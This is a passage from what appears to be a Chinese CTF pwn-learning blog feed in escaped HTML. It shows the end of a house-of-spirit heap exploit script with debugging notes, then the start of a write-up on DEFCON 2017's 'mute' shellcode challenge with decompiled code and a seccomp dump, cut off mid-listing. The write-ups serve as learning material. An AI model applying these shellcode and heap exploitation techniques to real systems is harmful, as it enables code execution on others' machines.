class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;48\n&amp;quot;&lt;/span&gt;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwn&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;house_of_spirit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwn()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;排错&#34;&gt;&lt;a href=&#34;#排错&#34; class=&#34;headerlink&#34; title=&#34;排错&#34;&gt;&lt;/a&gt;排错&lt;/h3&gt;&lt;p&gt;​		自己写的exp一直有问题,有一大片后面的选择\n&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;EASY HOTEL&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;\n1. check in\n2. check out\n3. goodbye\nyour choice :的输出&lt;/p&gt;
&lt;p&gt;​		捣鼓半天是leak那里出问题了..一个回车引发的血案……….草……… 造成了后面一堆的错乱,&lt;font color=&#34;red&#34;&gt;为啥gdb里不影响呢? &lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		这里要用send,因为存在offbyone,所以不需要回车,可以正好填满缓冲区,然后把rbp打印出来&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;leak&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;     &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; fake_addr,shellcode_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;     payload = shellcode.rjust(&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;     p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;who are u?\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;     p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		感觉貌似就算输入48个字符和\n,也不会有影响呀,是影响了后面的东西吗,比如这个\n作为后面的输入了? &lt;font color=&#34;red&#34;&gt;是的,是这样&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;是的,理论上48个字符后,下一个字符,会放到ebp-0x38,也就是刚才输入的who are u后面的前方(不信可以输入49个a试试)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400B1F                 call    sub_4007DF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400B24                 cdqe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400B26                 mov     [rbp+var_38], rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000400B2A                 mov     eax, 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608202658654.png&#34; alt=&#34;image-20230608202658654&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	不正常的,不正常是因为\n被give you id读取了,然后65\n和give your money后面全乱了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608203836560.png&#34; alt=&#34;image-20230608203836560&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608200524103.png&#34; alt=&#34;image-20230608200524103&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		正常的(伪造这个0x41的位置),释放后再申请,前面18个随便填充,然后就覆盖返回地址了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608201414380.png&#34; alt=&#34;image-20230608201414380&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;待整理&#34;&gt;&lt;a href=&#34;#待整理&#34; class=&#34;headerlink&#34; title=&#34;待整理&#34;&gt;&lt;/a&gt;待整理&lt;/h1&gt;&lt;p&gt;​	感觉貌似就算输入48个字符和\n,也不会有影响呀,是影响了后面的东西吗,比如这个\n作为后面的输入了? &lt;font color=&#34;red&#34;&gt;是的,是这样&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;程序运行起来了,接入pid调试&lt;/p&gt;
&lt;p&gt;,或者能不能直接看内存空间&lt;/p&gt;
&lt;p&gt;Gdb attach本地进程进去	&lt;/p&gt;
&lt;p&gt;搞一搞pwntools,深入理解下&lt;/p&gt;
&lt;p&gt;house_of_spirit 也有一个send&lt;/p&gt;
&lt;p&gt;你的exp有问题…不过确实可以找一下其他的学一下&lt;/p&gt;
&lt;p&gt;​		2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/sinat_35360663/article/details/128510319&#34;&gt;https://blog.csdn.net/sinat_35360663/article/details/128510319&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;后面有个总结不错&lt;/p&gt;
&lt;p&gt;一个回车惹的祸…&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-06-08T12:51:23.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/</id>
        <title>pwn入门-32-defcon2017资格赛-mute</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/"/>
        <content type="html">&lt;p&gt;​		侧信道是个很有意思的东西…万物皆可侧信道…各种奇奇怪怪的方法&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/image-20230605223341877.png&#34; alt=&#34;image-20230605223341877&#34; style=&#34;zoom: 33%;&#34;&gt;



&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/image-20230606182030547.png&#34; alt=&#34;image-20230606182030547&#34; style=&#34;zoom:33%;&#34;&gt;





&lt;p&gt;&lt;a href=&#34;https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute&#34;&gt;https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		好多年前的defcon的题了,但现在来看也并不简单,一方面考察了脑洞,要想到侧信道的办法,另一方面要有比较深厚的计算机基础,比如了解系统调用,会写汇编,对汇编比较熟悉才能写出来exp.&lt;/p&gt;
&lt;h2 id=&#34;程序分析&#34;&gt;&lt;a href=&#34;#程序分析&#34; class=&#34;headerlink&#34; title=&#34;程序分析&#34;&gt;&lt;/a&gt;程序分析&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  FILE *v3; &lt;span class=&#34;comment&#34;&gt;// rdi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf = mmap(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;uLL, &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;SILENCE, FOUL DAEMON!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = _bss_start;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fflush(_bss_start);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dropSyscalls(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( v5 != &lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 += read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; - v5);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (__fastcall *)(FILE *))buf)(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		读取一段内容到buf,然后执行读取的内容,很明显,要读取一段shellcode,但是禁用了一些系统调用&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/side&lt;span class=&#34;meta&#34;&gt;# seccomp-tools dump ./mute&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SILENCE, FOUL DAEMON!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000004&lt;/span&gt;  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0001&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xc000003e&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != ARCH_X86_64) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0019&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0002&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0003&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x35&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A &amp;lt; &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0005&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0e&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != &lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0019&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0005&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == read) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0006&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000002&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == open) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0007&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0a&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000003&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == close) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x09&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000004&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == stat) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0009&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x08&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000005&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == fstat) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000006&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == lstat) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0011&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000007&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == poll) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0012&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x05&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000008&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == lseek) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x04&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000009&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == mmap) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0014&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x03&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000000a&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == mprotect) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0015&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x02&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000000b&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == munmap) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0016&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000000c&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == brk) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0017&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000003b&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != execve) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span 